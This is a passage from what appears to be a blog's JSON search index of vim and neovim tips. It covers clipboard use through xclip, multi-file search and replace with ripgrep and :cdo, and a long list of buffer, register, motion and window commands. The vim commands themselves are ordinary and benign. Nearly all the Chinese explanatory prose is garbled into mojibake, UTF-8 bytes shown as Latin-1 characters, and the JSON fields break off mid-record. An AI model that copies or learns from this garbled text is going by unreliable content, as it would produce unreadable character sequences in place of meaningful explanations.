å‰ªè´´æ¿ï¼Œé€‰æ‹©ä¹‹åå¤åˆ¶å‰ªè´´æ¿ å¦‚ä¸‹å›¾ï¼Œæˆ‘ç”¨é¼ æ ‡é€‰æ‹©äº†12345, ä½†æ˜¯æ²¡æœ‰æŒ‰ctrl + c, è¿™æ—¶å€™ä½ æ‰“å¼€nvimï¼Œ æ‰§è¡Œ:reg, å¯ä»¥çœ‹åˆ°æ³¨å†Œå™¨\n\u0026#34;* 12345 å¦‚æœæŒ‰äº†ctrl + c\n\u0026#34;* 12345 \u0026#34;+ 12345 æ‰€ä»¥ï¼Œåœ¨vimä¸­å¦‚æœæƒ³ç²˜è´´ç³»ç»Ÿå‰ªè´´æ¿ä¸­çš„å†…å®¹ï¼Œå¯ä»¥æ˜¯ç”¨ C-R * æˆ–è€… C-R +\nå¦‚ä½•æŠŠvim bufferä¸­çš„å…¨éƒ¨å†…å®¹å¤åˆ¶åˆ°ç³»ç»Ÿå‰ªè´´æ¿? :%y+ ","permalink":"https://wdd.js.org/vim/clipboard/","summary":"neovimå¦‚ä½•ä¸ç³»ç»Ÿå‰ªè´´æ¿äº¤äº’ï¼Ÿ neovimå’Œç³»ç»Ÿå‰ªè´´æ¿çš„äº¤äº’æ–¹å¼å’Œvimçš„æœºåˆ¶æ˜¯ä¸åŒçš„ï¼Œæ‰€ä»¥ä¸è¦å…ˆå…¥ä¸ºä¸»çš„ç”¨vimçš„æ–¹å¼ä½¿ç”¨neovimã€‚\nneoviméœ€è¦å¤–éƒ¨çš„ç¨‹åºä¸ç³»ç»Ÿå‰ªè´´æ¿è¿›è¡Œäº¤äº’ï¼Œå‚è€ƒ:help clipboard\nneovimæŒ‰ç…§å¦‚ä¸‹çš„ä¼˜å…ˆçº§çº§æ–¹å¼é€‰æ‹©äº¤äº’ç¨‹åºï¼š\n- |g:clipboard| - pbcopy, pbpaste (macOS) - wl-copy, wl-paste (if $WAYLAND_DISPLAY is set) - xclip (if $DISPLAY is set) - xsel (if $DISPLAY is set) - lemonade (for SSH) https://github.com/pocke/lemonade - doitclient (for SSH) http://www.chiark.greenend.org.uk/~sgtatham/doit/ - win32yank (Windows) - termux (via termux-clipboard-set, termux-clipboard-set) - tmux (if $TMUX is set) å› ä¸ºæˆ‘çš„æ“ä½œç³»ç»Ÿæ˜¯linux, æ‰€ä»¥æ–¹ä¾¿çš„æ–¹å¼æ˜¯ç›´æ¥å®‰è£…xclipã€‚\nsudo pacman -Syu xclip ä¸¤ä¸ªç³»ç»Ÿå‰ªè´´æ¿æœ‰ä½•ä¸åŒï¼Ÿ å¯¹äºwindowså’Œmacæ¥è¯´ï¼Œåªæœ‰æœ‰ä¸€ä¸ªç³»ç»Ÿå‰ªè´´æ¿ï¼Œå¯¹äºlinuxæœ‰ä¸¤ä¸ªã€‚\nå‰ªè´´æ¿ï¼Œé¼ æ ‡é€‰æ‹©å‰ªè´´æ¿ å‰ªè´´æ¿ï¼Œé€‰æ‹©ä¹‹åå¤åˆ¶å‰ªè´´æ¿ å¦‚ä¸‹å›¾ï¼Œæˆ‘ç”¨é¼ æ ‡é€‰æ‹©äº†12345, ä½†æ˜¯æ²¡æœ‰æŒ‰ctrl + c, è¿™æ—¶å€™ä½ æ‰“å¼€nvimï¼Œ æ‰§è¡Œ:reg, å¯ä»¥çœ‹åˆ°æ³¨å†Œå™¨","title":"å’Œç³»ç»Ÿå‰ªè´´æ¿è¿›è¡Œäº¤äº’"},{"content":"åœ¨vscodeä¸­ï¼Œå¯ä»¥é€‰ä¸­ä¸€ä¸ªç›®å½•ï¼Œç„¶ååœ¨ç›®å½•ä¸­æœç´¢å¯¹åº”çš„å…³é”®è¯ï¼Œå†æŸ¥æ‰¾åˆ°å¯¹åº”æ–‡ä»¶ä¸­ï¼Œç„¶ååšæ›¿æ¢ã€‚\nåœ¨vimä¹Ÿå¯ä»¥è¿™æ ·åšã€‚\nä½†æ˜¯è¿™ä»¶äº‹è¦åˆ†æˆä¸¤æ­¥ã€‚\næ ¹æ®å…³é”®è¯ï¼ŒæŸ¥æ‰¾æ–‡ä»¶ å¯¹å¤šä¸ªæ–‡ä»¶è¿›è¡Œæ›¿æ¢ æœç´¢å…³é”®è¯ æœç´¢å…³é”®è¯å¯ä»¥ç”¨grep, æˆ–è€…vimè‡ªå¸¦çš„vimgrepã€‚\nä½†æ˜¯æˆ‘æ›´å–œæ¬¢ç”¨ripgrepï¼Œå› ä¸ºé€Ÿåº¦å¾ˆå¿«ã€‚\nripgrepä¹Ÿæœ‰å¯¹åº”çš„vimæ’ä»¶ https://github.com/jremmen/vim-ripgrep\nä¾‹å¦‚è¦æœç´¢å…³é”®è¯ key1, é‚£ä¹ˆç¬¦åˆå…³é”®è¯çš„æ–‡ä»¶å°†ä¼šè¢«æ”¾åˆ°quickfixåˆ—è¡¨ä¸­ã€‚\n:Rg key1 å¯ä»¥ç”¨ :copen æ¥æ‰“å¼€quickfixåˆ—è¡¨ã€‚\næ›¿æ¢ cdo :cdo %s/key1/key2/gc cè¡¨ç¤ºåœ¨æ›¿æ¢çš„æ—¶å€™ï¼Œéœ€è¦æ‰‹å·¥ç¡®è®¤æ¯ä¸€é¡¹ã€‚\nåœ¨æ›¿æ¢çš„æ—¶å€™ï¼Œå¯ä»¥è¾“å…¥\ny (yes)æ‰§è¡Œæ›¿æ¢ n (no)å¿½ç•¥æ­¤å¤„æ›¿æ¢ a (all)æ›¿æ¢æ­¤å¤„å’Œä¹‹åçš„æ‰€æœ‰é¡¹ç›® q (quit) é€€å‡ºæ›¿æ¢è¿‡ç¨‹ l (last) æ›¿æ¢æ­¤å¤„åé€€å‡º ^E å‘ä¸Šæ»šåŠ¨å±å¹• ^Y å‘ä¸‹æ»šåŠ¨å±å¹• ","permalink":"https://wdd.js.org/vim/search-dir-replace/","summary":"åœ¨vscodeä¸­ï¼Œå¯ä»¥é€‰ä¸­ä¸€ä¸ªç›®å½•ï¼Œç„¶ååœ¨ç›®å½•ä¸­æœç´¢å¯¹åº”çš„å…³é”®è¯ï¼Œå†æŸ¥æ‰¾åˆ°å¯¹åº”æ–‡ä»¶ä¸­ï¼Œç„¶ååšæ›¿æ¢ã€‚\nåœ¨vimä¹Ÿå¯ä»¥è¿™æ ·åšã€‚\nä½†æ˜¯è¿™ä»¶äº‹è¦åˆ†æˆä¸¤æ­¥ã€‚\næ ¹æ®å…³é”®è¯ï¼ŒæŸ¥æ‰¾æ–‡ä»¶ å¯¹å¤šä¸ªæ–‡ä»¶è¿›è¡Œæ›¿æ¢ æœç´¢å…³é”®è¯ æœç´¢å…³é”®è¯å¯ä»¥ç”¨grep, æˆ–è€…vimè‡ªå¸¦çš„vimgrepã€‚\nä½†æ˜¯æˆ‘æ›´å–œæ¬¢ç”¨ripgrepï¼Œå› ä¸ºé€Ÿåº¦å¾ˆå¿«ã€‚\nripgrepä¹Ÿæœ‰å¯¹åº”çš„vimæ’ä»¶ https://github.com/jremmen/vim-ripgrep\nä¾‹å¦‚è¦æœç´¢å…³é”®è¯ key1, é‚£ä¹ˆç¬¦åˆå…³é”®è¯çš„æ–‡ä»¶å°†ä¼šè¢«æ”¾åˆ°quickfixåˆ—è¡¨ä¸­ã€‚\n:Rg key1 å¯ä»¥ç”¨ :copen æ¥æ‰“å¼€quickfixåˆ—è¡¨ã€‚\næ›¿æ¢ cdo :cdo %s/key1/key2/gc cè¡¨ç¤ºåœ¨æ›¿æ¢çš„æ—¶å€™ï¼Œéœ€è¦æ‰‹å·¥ç¡®è®¤æ¯ä¸€é¡¹ã€‚\nåœ¨æ›¿æ¢çš„æ—¶å€™ï¼Œå¯ä»¥è¾“å…¥\ny (yes)æ‰§è¡Œæ›¿æ¢ n (no)å¿½ç•¥æ­¤å¤„æ›¿æ¢ a (all)æ›¿æ¢æ­¤å¤„å’Œä¹‹åçš„æ‰€æœ‰é¡¹ç›® q (quit) é€€å‡ºæ›¿æ¢è¿‡ç¨‹ l (last) æ›¿æ¢æ­¤å¤„åé€€å‡º ^E å‘ä¸Šæ»šåŠ¨å±å¹• ^Y å‘ä¸‹æ»šåŠ¨å±å¹• ","title":"æœç´¢å·¥ä½œç›®å½•ä¸‹çš„æ–‡ä»¶å¹¶æ›¿æ¢"},{"content":" Info Cè¡¨ç¤ºæŒ‰ä½Ctrl, C-oè¡¨ç¤ºåŒæ—¶æŒ‰ä½Ctrlå’Œo 1. åœ¨tmuxä¸­ vim-airlineæ’ä»¶é¢œè‰²æ˜¾ç¤ºä¸æ­£å¸¸ è§£å†³æ–¹æ¡ˆï¼š\nexport TERM=screen-256color 2. bufferç›¸å…³æ“ä½œ :ls # æ˜¾ç¤ºæ‰€æœ‰æ‰“å¼€çš„buffer :b {bufferName} #æ”¯æŒtabé”®è‡ªåŠ¨è¡¥å…¨ :bd # å…³é—­å½“å‰buffer :bn # åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªbuffer :bp # åˆ‡æ¢åˆ°ä¸Šä¸€ä¸ªbuffer :b# # åˆ‡æ¢åˆ°ä¸Šä¸€ä¸ªè®¿é—®è¿‡çš„buffer :b1 # åˆ‡æ¢åˆ°buffer1 :bm # åˆ‡æ¢åˆ°æœ€è¿‘ä¿®æ”¹è¿‡çš„buffer :sb {bufferName} # ä¸Šä¸‹åˆ†å± :vert sb {bufferName} # å·¦å³åˆ†å± 3. è·³è½¬åˆ°å¯¹åº”çš„ç¬¦å·ä¸Š ä¸‹é¢è¿™ç§ç¬¦å·ï¼Œä¸€èˆ¬éƒ½æ˜¯æˆåŒæˆå¯¹çš„ï¼Œåªè¦åœ¨å…¶ä¸­ä¸€ä¸ªä¸ŠæŒ‰%, å°±ä¼šè‡ªåŠ¨è·³è½¬åˆ°å¯¹åº”çš„ç¬¦å·\n() [] {} 4. å…³é—­netrwçš„banner å¦‚æœç†Ÿç»ƒçš„æ˜¯ç”¨äº†netrwï¼Œå°±å¯ä»¥æŠŠé»˜è®¤å¼€å¯çš„bannerç»™å…³é—­æ‰ã€‚\nlet g:netrw_banner = 0 let g:netrw_liststyle = 3 let g:netrw_winsize = 25 5. å¦‚ä½•åŒæ—¶ä¿å­˜æ‰€æœ‰å‘ç”Ÿå˜åŒ–çš„æ–‡ä»¶ï¼Ÿ æŠŠæ‰€æœ‰å‘ç”Ÿå˜åŒ–çš„æ–‡ä»¶ç»™ä¿å­˜ :wa æŠŠæ‰€æœ‰å‘ç”Ÿå˜åŒ–çš„æ–‡ä»¶éƒ½ä¿å­˜ï¼Œç„¶åé€€å‡ºvim :xa é€€å‡ºvim, æ‰€æœ‰å‘ç”Ÿå˜åŒ–çš„æ–‡ä»¶éƒ½ä¸ä¿å­˜ï¼Œ:qa! 6. æ’å…¥å½“å‰æ—¶é—´ :r!date 7. å…‰æ ‡ä¸‹çš„æ–‡ä»¶è·³è½¬ æŒ‰gfå¯ä»¥è·³è½¬å…‰æ ‡ä¸‹çš„æ–‡ä»¶\nimport {say} from \u0026#39;./api\u0026#39; ä¹Ÿæœ‰å¯èƒ½è·³çš„ä¸å‡†ç¡®ï¼Œæˆ–è€…æ‰¾ä¸åˆ°ï¼Œå› ä¸ºvimä¸çŸ¥é“æ–‡ä»¶åç¼€\n:set suffixesadd+=.js 8. æ–‡ä»¶å¯¹æ¯” å¦‚æœä½ å®‰è£…äº†vim, vimdiffå°±ä¼šè‡ªåŠ¨æºå¸¦\nvimdiff a.txt b.txt 9. åœ¨æ’å…¥æ¨¡å¼å¿«é€Ÿåˆ é™¤ C-h åˆ é™¤å‰ä¸€ä¸ªå­—ç¬¦ C-w åˆ é™¤å‰ä¸€ä¸ªå•è¯ C-u åˆ é™¤åˆ°è¡Œé¦– 10. åœ¨å¤šè¡Œæœ«å°¾å¢åŠ ç‰¹å®šçš„å­—ç¬¦ ä¾‹å¦‚ä¸‹é¢çš„å‘½ä»¤ï¼Œå¯ä»¥åœ¨å¤šè¡Œæœ«å°¾å¢åŠ ;\n:%s/$/;/ 11. å¯¹æ’¤é”€è¿›è¡Œæ’¤é”€ uå¯ä»¥ç”¨æ¥æ’¤é”€ï¼ŒC-rå¯ä»¥ç”¨æ¥å¯¹æ’¤é”€è¿›è¡Œæ’¤é”€\n12. é‡æ–°è¯»å–æ–‡ä»¶ å‡å¦‚ä½ å¯¹ä¸€ä¸ªæ–‡ä»¶è¿›è¡Œäº†ä¸€äº›ä¿®æ”¹ï¼Œä½†æ˜¯è¿˜æ²¡æœ‰ä¿å­˜ï¼Œè¿™æ˜¯ä½ æƒ³ä¸¢å¼ƒè¿™äº›ä¿®æ”¹ï¼Œå¦‚æœç”¨æ’¤é”€çš„è¯ï¼Œå¤ªéº»çƒ¦ã€‚\nä½ å¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤ï¼Œè®©vimé‡æ–°è¯»å–ç£ç›˜ä¸Šçš„æ–‡ä»¶ï¼Œè¦†ç›–å½“å‰bufferä¸­çš„æ–‡ä»¶ã€‚\n:e! 13. å¯¹å½“å‰bufferæ‰§è¡Œå¤–éƒ¨å‘½ä»¤ ä¾‹å¦‚å¯¹goä»£ç è¿›è¡Œæ ¼å¼åŒ–\n:!go fmt % ä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªjsonæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è¡Œé€‰ä¸­ä¹‹åæ‰§è¡Œ:'\u0026lt;,'\u0026gt;!jq, å¦‚æœéœ€è¦å¯¹å…¨æ–‡è¿›è¡Œjsonæ ¼å¼åŒ–ï¼Œå¯ä»¥ä½¿ç”¨:%!jq\n{\u0026#34;name\u0026#34;:\u0026#34;wdd\u0026#34;,\u0026#34;age\u0026#34;:1} { \u0026#34;name\u0026#34;: \u0026#34;wdd\u0026#34;, \u0026#34;age\u0026#34;: 1 } Warning !å’Œå‘½ä»¤ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼ 14. åªè¯»æ¨¡å¼æ‰“å¼€æ–‡ä»¶ åªè¯»æ¨¡å¼æ‰“å¼€æ–‡ä»¶: vim -R file ç¦æ­¢ä¿®æ”¹æ‰“å¼€æ–‡ä»¶: vim -M file 15. æ˜¾ç¤ºæˆ–è€…éšè—ç‰¹æ®Šå­—ç¬¦ :set list :set nolist 16. æŠŠå¦ä¸€ä¸ªæ–‡ä»¶è¯»å–åˆ°å½“å‰bufferé‡Œé¢ b.txtæ˜¯å¦ä¸€ä¸ªæ–‡ä»¶\n# è¯»å–åˆ°å…‰æ ‡çš„ä½ç½® :read b.txt # è¯»åŒºåˆ°å½“å‰bufferçš„å¼€å¤´ :0read b.txt # è¯»åŒºåˆ°å½“å‰bufferçš„ç»“å°¾ :$read b.txt 17. æŠŠå½“å‰æ–‡ä»¶çš„ä¸€éƒ¨åˆ†å†™å…¥åˆ°å¦ä¸€ä¸ªæ–‡ä»¶ä¸­ # æŠŠå½“å‰æ–‡ä»¶å†™å…¥åˆ°c.txt, å¦‚æœc.txtå­˜åœ¨ï¼Œåˆ™å†™å…¥å¤±è´¥ :write c.txt # æŠŠå½“å‰æ–‡ä»¶å†™å…¥åˆ°c.txt, å¦‚æœc.txtå­˜åœ¨ï¼Œåˆ™å¼ºåˆ¶å†™å…¥ # æ³¨æ„è¿™é‡Œ!å¿…é¡»ç´§è·Ÿç€write, å¹¶ä¸”ç©ºæ ¼æ˜¯å¿…é¡»çš„ï¼Œå¦åˆ™å°±æ˜¯æ‰§è¡Œå¤–éƒ¨å‘½ä»¤äº† :write! c.txt # æŠŠå½“å‰æ–‡ä»¶çš„å½“å‰è¡Œåˆ°æ–‡ä»¶æœ«å°¾å†™å…¥åˆ°c.txt :.$write c.txt # æŠŠå½“å‰æ–‡ä»¶ä»¥è¿½åŠ çš„æ–¹å¼å†™å…¥åˆ°å¦ä¸€ä¸ªæ–‡ä»¶ä¸­ :write \u0026gt;\u0026gt;c.txt 18. è‡ªå¸¦æ–‡ä»¶æµè§ˆå™¨çš„å¿…èƒŒå‘½ä»¤ :Sex # æ–‡ä»¶æµè§ˆå™¨ä¸Šä¸‹åˆ†å¸ƒ :Vex # æ–‡ä»¶æµè§ˆå™¨å·¦å³åˆ†å¸ƒ F1 æ‰“å¼€å¸®åŠ©ä¿¡æ¯ % åˆ›å»ºæ–‡ä»¶ d åˆ›å»ºç›®å½• D åˆ é™¤æ–‡ä»¶æˆ–è€…ç›®å½• R æ–‡ä»¶é‡å‘½å gh éšè—ä»¥.å¼€å¤´çš„æ–‡ä»¶ è¿”å›ä¸Šä¸€çº§ t ç”¨æ–°çš„æ ‡ç­¾é¡µé¢é¡µé¢æ‰“å¼€æ–‡ä»¶ c æŠŠæµè§ˆçš„ç›®å½•è®¾ç½®ä¸ºå½“å‰å·¥ä½œçš„ç›®å½• 19. æ‰§è¡Œå‘½ä»¤åï¼Œå¿«é€Ÿè¿›å…¥æ’å…¥æ¨¡å¼ C ä»å…‰æ ‡å¤„åˆ é™¤åˆ°è¡Œå°¾ï¼Œç„¶åè¿›å…¥æ’å…¥æ¨¡å¼ S æ¸…ç©ºå½“å‰è¡Œçš„å†…å®¹ï¼Œç„¶åè¿›å…¥æ’å…¥æ¨¡å¼ s åˆ é™¤å…‰æ ‡ä¸‹çš„å­—ç¬¦ï¼Œç„¶åè¿›å…¥æ’å…¥æ¨¡å¼ O\tåœ¨å½“å‰è¡Œä¸Šæ’å…¥ä¸€è¡Œï¼Œç„¶åè¿›å…¥æ’å…¥æ¨¡å¼ o\tåœ¨å½“å‰è¡Œä¸‹æ’å…¥ä¸€è¡Œï¼Œç„¶åè¿›å…¥æ’å…¥æ¨¡å¼ I\tå…‰æ ‡ç§»åŠ¨å½“å½“å‰è¡Œçš„ä¸€ä¸ªå­—ç¬¦å‰ï¼Œç„¶åè¿›å…¥æ’å…¥æ¨¡å¼ A\tè´¯æ ‡ç§»åŠ¨åˆ°å½“å‰èˆªçš„æœ€åä¸€ä¸ªå­—ç¬¦åï¼Œç„¶åè¿›å…¥æ’å…¥æ¨¡å¼ 20. å¿…ä¼šçš„å‡ ä¸ªå¯„å­˜å™¨ æœ‰åå¯„å­˜å™¨ a-z é»‘æ´å¯„å­˜å™¨ _ è¡¨è¾¾å¼å¯„å­˜å™¨ = å½“å‰æ–‡ä»¶åå¯„å­˜å™¨ % ä¸Šæ¬¡æŸ¥æ‰¾çš„æ¨¡å¼å¯„å­˜å™¨ / å¤åˆ¶ä¸“ç”¨å¯„å­˜å™¨ 0 C-r æ˜¯ç”¨æ¥è°ƒç”¨å¯„å­˜å™¨çš„ã€‚æ¯”å¦‚è¯´æˆ‘æƒ³ç²˜è´´å½“å‰æ–‡ä»¶åï¼Œæˆ‘åªéœ€è¦æŒ‰C-r %, å°±å¯ä»¥è‡ªåŠ¨ç²˜è´´åˆ°å½“å‰çš„æ–‡ä»¶ä¸­\n21. åŸºäºtagçš„è·³è½¬ C-] è·³åˆ°å¯¹åº”tagä¸Š C-o è·³å›æ¥ C-t è·³å›æ¥ C-w ] åœ¨æ–°çš„windowä¸­æ‰“å¼€æ ‡ç­¾ C-w } é¢„è§ˆ pclose å…³é—­é¢„è§ˆ 22. htmlæ ‡ç­¾åˆ é™¤ dit åˆ é™¤æ ‡ç­¾å†…éƒ¨çš„å…ƒç´  dat åˆ é™¤æ ‡ç­¾ 23. åŸå§‹æ ¼å¼ç²˜è´´ å¦‚æœç²˜è´´åˆ°vimä¸­çš„æ–‡æœ¬ç¼©è¿›å‡ºç°é—®é¢˜ï¼Œ\n:set paste ç„¶åå†æ‰§è¡ŒC-vç²˜è´´\nå–æ¶ˆç²˜è´´æ¨¡å¼ç”¨ :set nopaste\n24. æŒ‰åˆ—åˆ é™¤æˆ–è€…æŒ‰åˆ—ä¿ç•™ # åªä¿ç•™ç¬¬äºŒåˆ— :%!awk \u0026#39;{print $2}\u0026#39; # åˆ é™¤ç¬¬äºŒåˆ— :%!awk \u0026#39;{$2=\u0026#34;\u0026#34;;print $0}\u0026#39; 25. æŸ¥æ‰¾å¤šä¸ªå…³é”®è¯ /key1\\|key2\\|key3 26. å¿«é€Ÿå°†å…‰æ ‡æ‰€åœ¨è¡Œç§»åŠ¨åˆ°å±å¹•ä¸­å¤® zz 26. çª—å£å¿«æ·é”® å·¥ä½œåŒºåˆ‡åˆ†çª—å£å‘½ä»¤ s æ°´å¹³åˆ‡åˆ†çª—å£ï¼Œæ–°çª—å£ä»ç„¶æ˜¾ç¤ºå½“å‰ç¼“å†²åŒº v å‚ç›´åˆ‡åˆ†çª—å£ï¼Œæ–°çª—å£ä»ç„¶æ˜¾ç¤ºå½“å‰ç¼“å†²åŒº sp {file} æ°´å¹³åˆ‡åˆ†ä¸ºå½“å‰çª—å£ï¼Œæ–°çª—å£ä¸­è½½å…¥file vsp {file} å‚ç›´åˆ‡åˆ†çª—å£ï¼Œå¹¶åœ¨æ–°çª—å£è½½å…¥file çª—å£ä¹‹é—´åˆ‡æ¢ w åœ¨çª—å£é—´å¾ªç¯åˆ‡æ¢ h åˆ‡æ¢åˆ°å·¦è¾¹çª—å£ l åˆ‡æ¢åˆ°å³è¾¹çª—å£ j åˆ‡æ¢åˆ°ä¸‹è¾¹çš„çª—å£ k åˆ‡æ¢åˆ°ä¸Šè¾¹çš„çª—å£ çª—å£å…³é—­ :clo[se] å…³é—­æ´»åŠ¨çª—å£ :on[ly] å…³é—­å…¶ä»–çª—å£ çª—å£æ”¹å˜å¤§å° = ä½¿æ‰€æœ‰çª—å£ç­‰å®½ç­‰é«˜ _ æœ€å¤§åŒ–æ´»åŠ¨çª—å£çš„é«˜åº¦ | æœ€å¤§åŒ–æ´»åŠ¨ 27. 9ç§æ’å…¥æ¨¡å¼ i è¿›å…¥æ’å…¥æ¨¡å¼ï¼Œæ‰€è¾“å…¥æ–°çš„å†…å®¹å°†ä¼šåœ¨æ­£å¸¸æ¨¡å¼æ‰€åœ¨å…‰æ ‡çš„å‰é¢ a è¿›å…¥æ’å…¥æ¨¡å¼ï¼Œæ‰€è¾“å…¥çš„æ–°çš„å†…å®¹å°†ä¼šåœ¨æ­£å¸¸æ¨¡å¼æ‰€åœ¨å…‰æ ‡çš„åé¢ ä½ çŸ¥é“ä»æ’å…¥æ¨¡å¼é€€å‡ºçš„æ—¶å€™ï¼Œå…‰æ ‡ä¼šå‘å‰ç§»åŠ¨ä¸€ä¸ªå­—ç¬¦å—ï¼Ÿ\nè¿›å…¥æ’å…¥æ¨¡å¼çš„æŠ€å·§\ni åœ¨å…‰æ ‡å‰æ’å…¥ a åœ¨å…‰æ ‡åæ’å…¥ A åœ¨è¡Œçš„æœ«å°¾è¿›å…¥æ’å…¥ I (å¤§å†™çš„i), åœ¨è¡Œçš„ç¬¬ä¸€ä¸ªéç©ºç™½å­—ç¬¦å‰è¿›å…¥æ’å…¥æ¨¡å¼ C åˆ é™¤å…‰æ ‡åçš„æ‰€æœ‰å­—ç¬¦ï¼Œç„¶åè¿›å…¥æ’å…¥æ¨¡å¼ s åˆ é™¤å…‰æ ‡åçš„ä¸€ä¸ªå­—ç¬¦ï¼Œç„¶åè¿›å…¥æ’å…¥æ¨¡å¼ S æ¸…ç©ºå½“å‰è¡Œï¼Œç„¶åè¿›å…¥æ’å…¥æ¨¡å¼ o åœ¨å½“å‰è¡Œçš„ä¸‹é¢ä¸€è¡Œæ–°å»ºä¸€è¡Œï¼Œå¹¶è¿›å…¥æ’å…¥æ¨¡å¼ O åœ¨å½“å‰è¡Œçš„ä¸Šé¢ä¸€è¡Œæ–°å»ºä¸€è¡Œï¼Œå¹¶è¿›å…¥æ’å…¥æ¨¡å¼ 28. ç®—æ•°è¿ç®— ctrl a å¯¹æ•°å­—è¿›è¡ŒåŠ è¿ç®—ï¼Œ å¦‚æœå…‰æ ‡ä¸åœ¨æ•°å­—ä¸Šï¼Œå°†ä¼šè‡ªåŠ¨å‘åç§»åŠ¨é“å¯¹åº”çš„æ•°å­—ä¸Š ctrl x å¯¹æ•°å­—è¿›è¡Œå‡è¿ç®— 29. å¯è§†æ¨¡å¼å¿«æ·é”® v æ¿€æ´»é¢å‘å­—ç¬¦çš„å¯è§†æ¨¡å¼ å†æŒ‰ä¸€æ¬¡ï¼Œå¯ä»¥é€€å‡º V æ¿€æ´»é¢å‘è¡Œçš„å¯è§†æ¨¡å¼ï¼Œ å†æŒ‰ä¸€æ¬¡å¯ä»¥é€€å‡º ctrl v æ¿€æ´»é¢å‘åˆ—çš„å¯è§†æ¨¡å¼ gv é‡é€‰ä¸Šæ¬¡çš„é€‰åŒº o ç§»åŠ¨é€‰åŒºçš„ç«¯ç‚¹ 30. æŠŠå…‰æ ‡æ‰€åœ¨çš„å•è¯æ’å…¥åˆ°Ex C-r C-w 31. å…¨å±€ æ–‡ä»¶å¦å­˜ä¸º :saveas filename å…³é—­å½“å‰çª—å£ :close 32. å…‰æ ‡ç§»åŠ¨ ç§»åŠ¨å…‰æ ‡åˆ°é¡µé¢é¡¶éƒ¨ï¼Œä¸­éƒ¨ï¼Œåº•éƒ¨ H,M,L ç§»åŠ¨åˆ°ä¸‹ä¸ªå•è¯å¼€å¤´ï¼Œç»“å°¾ w,e ç§»åŠ¨åˆ°ä¸Šä¸ªå•è¯å¼€å¤´ b ç§»åŠ¨å…‰æ ‡ ä¸Šä¸‹å·¦å³ k,j,h,l ç§»åŠ¨åˆ°åŒ¹é…çš„æ‹¬å· % ç§»åŠ¨åˆ°è¡Œé¦– 0 ç§»åŠ¨åˆ°è¡Œé¦–éç©ºç™½å­—ç¬¦ ^ ç§»åŠ¨åˆ°è¡Œå°¾éç©ºç™½å­—ç¬¦ g ç§»åŠ¨åˆ°è¡Œå°¾ $ ç§»åŠ¨åˆ°æ–‡ä»¶ç¬¬ä¸€è¡Œ gg ç§»åŠ¨åˆ°æ–‡ä»¶æœ€åä¸€è¡Œ G ç§»åŠ¨åˆ°ç¬¬10è¡Œ 10G ç§»åŠ¨å±å¹•ä½¿å…‰æ ‡å±…ä¸­ zz è·³è½¬åˆ°ä¸Šä¸€æ¬¡çš„ä½ç½® ctrl+o ä¾‹å¦‚ä½ åœ¨159è¡Œï¼Œç„¶åä½ æŒ‰äº†gg, å…‰æ ‡è°ƒåˆ°äº†ç¬¬ä¸€è¡Œï¼Œç„¶åä½ æŒ‰ctrl+o, å…‰æ ‡ä¼šå›åˆ°159è¡Œ è·³è½¬åˆ°ä¸‹ä¸€æ¬¡çš„ä½ç½® ctrl+i è·³è½¬åˆ°ä¸‹ä¸ªåŒæ ·å•è¯çš„åœ°æ–¹ * è·³è½¬åˆ°ä¸Šä¸ªåŒæ ·å•è¯çš„åœ°æ–¹ # è·³åˆ°å­—ç¬¦aå‡ºç°çš„ä½ç½® fa, Fa è°ƒåˆ°å­—ç¬¦aå‡ºç°çš„å‰ä¸€ä¸ªä½ç½® ta, Ta è·³åˆ°ä¹‹å‰çš„ä½ç½® `` è·³åˆ°ä¹‹å‰ä¿®æ”¹çš„ä½ç½® `. è·³åˆ°é€‰åŒºçš„èµ·å§‹ä½ç½® `\u0026lt; è·³åˆ°é€‰åŒºçš„ç»“æŸä½ç½® `\u0026gt; 33. æ»šåŠ¨å±å¹• å‘ä¸‹ï¼Œå‘ä¸Šæ»šåŠ¨ä¸€å± ctrl+b, ctrl+f å‘ä¸‹ï¼Œå‘ä¸Šæ»šåŠ¨åŠå± ctrl+d, ctrl+u 34. æ’å…¥æ¨¡å¼ å…‰æ ‡å‰ã€åæ’å…¥ iï¼Œa è¡Œé¦–ï¼Œè¡Œå°¾æ’å…¥ I, A åœ¨å½“å‰è¡Œä¸Šã€ä¸‹å¦ä¸€èµ·è¡Œæ’å…¥ O, o ä»å½“å‰å•è¯æœ«å°¾æ’å…¥ ea é€€å‡ºæ’å…¥æ¨¡å¼ esc åˆ é™¤å‰ä¸€ä¸ªå•è¯ ctrl+w åˆ é™¤åˆ°è¡Œé¦– ctrl+u 35. ç¼–è¾‘ æ›¿æ¢å…‰æ ‡ä¸‹çš„å­—ç¬¦ r å°†ä¸‹ä¸€è¡Œåˆå¹¶åˆ°å½“å‰è¡Œ J å°†ä¸‹ä¸€è¡Œåˆå¹¶åˆ°å½“å‰è¡Œï¼Œå¹¶ä¸€ç§ä¸­é—´çš„ç©ºç™½å­—ç¬¦ gJ æ¸…ç©ºå½“å‰è¡Œï¼Œå¹¶è¿›å…¥æ’å…¥æ¨¡å¼ cc æ¸…ç©ºå½“å‰å•è¯ï¼Œå¹¶è¿›å…¥æ’å…¥æ¨¡å¼ cw æ’¤é”€ä¿®æ”¹ u åˆ é™¤å…‰æ ‡ä¸‹çš„ä¸€ä¸ªå­—ç¬¦ï¼Œç„¶åè¿›å…¥æ’å…¥æ¨¡å¼ s 36. é€‰æ‹©æ–‡æœ¬ æ™®é€šå…‰æ ‡é€‰æ‹©, è¿›å…¥é€‰æ‹©æ–‡æœ¬æ¨¡å¼ v è¡Œé€‰æ‹©ï¼Œè¿›å…¥é€‰æ‹©æ–‡æœ¬æ¨¡å¼ V å—é€‰æ‹©ï¼Œè¿›å…¥é€‰æ‹©æ–‡æœ¬æ¨¡å¼ ctrl+v åœ¨å¤šè¡Œè¡Œé¦–æ’å…¥æ³¨é‡Š# ctrl+v ç„¶åé€‰æ‹©å¿«ï¼Œç„¶åè¾“å…¥I, ç„¶åè¾“å…¥#ï¼Œ ç„¶åæŒ‰esc æ³¨æ„ï¼Œè¾“å…¥IæŒ‡ä»¤æ—¶ï¼Œå…‰æ ‡åªä¼šå®šä½åˆ°ä¸€ä¸ªä½ç½®ï¼Œç¼–è¾‘çš„å†…å®¹ä¹Ÿåªæ˜¯åœ¨ä¸€ä¸ªä½ç½®ï¼Œä½†æ˜¯æŒ‰äº†escåï¼Œå¤šè¡Œéƒ½ä¼šå‡ºç°# 